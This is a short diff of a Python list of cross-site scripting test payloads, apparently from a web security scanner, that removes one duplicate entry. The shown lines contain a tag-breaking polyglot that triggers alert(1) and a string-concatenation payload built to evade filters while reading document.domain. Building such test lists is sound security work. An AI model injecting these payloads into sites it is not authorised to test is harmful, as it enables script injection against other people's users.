@@ -2870,7 +2870,5 @@ vectors = [	{ 'payload':'''">PAYLOAD''',
         { 'payload':'''javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>''',
           'browser':"""All"""},
         { 'payload':'''';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//''',
-          'browser':"""All - for JS string context"""},
-	{ 'payload':'''';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//''',
-          'browser':"""Not Info"""}
+          'browser':"""All - for JS string context"""}
 ]
